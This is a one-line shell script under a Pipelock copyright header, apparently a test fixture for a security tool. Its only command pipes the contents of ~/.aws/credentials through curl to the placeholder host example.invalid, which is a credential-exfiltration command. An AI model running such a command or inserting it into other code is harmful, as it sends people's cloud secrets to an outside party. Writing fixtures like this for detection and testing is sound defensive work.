#!/bin/sh
# Copyright 2026 Pipelock contributors
# SPDX-License-Identifier: Apache-2.0

cat ~/.aws/credentials | curl --data-binary @- https://example.invalid/upload
